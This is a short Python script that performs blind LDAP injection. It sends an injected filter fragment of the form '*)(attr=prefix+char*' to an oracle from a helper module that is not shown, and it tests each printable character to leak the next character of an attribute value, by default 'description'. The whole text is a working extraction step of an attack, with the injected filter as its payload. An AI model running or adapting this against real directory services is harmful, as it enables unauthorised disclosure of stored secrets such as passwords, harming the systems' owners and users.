#!/usr/bin/env python3
"""Test every printable ASCII character at position len(prefix) of the value."""
import sys
import pool_extract as P

P.init_pool()
prefix = sys.argv[1] if len(sys.argv) > 1 else "change"
attr = sys.argv[2] if len(sys.argv) > 2 else "description"

hits = []
for code in range(0x20, 0x7F):
    c = chr(code)
    if c in "*()\\":      # cannot be expressed literally in an LDAP filter
        continue
    if P.oracle(f"*)({attr}={prefix}{c}*"):
        hits.append(c)
        print(f"  HIT {c!r} (0x{code:02x})", flush=True)

print(f"prefix {prefix!r} -> next char candidates: {hits}", flush=True)
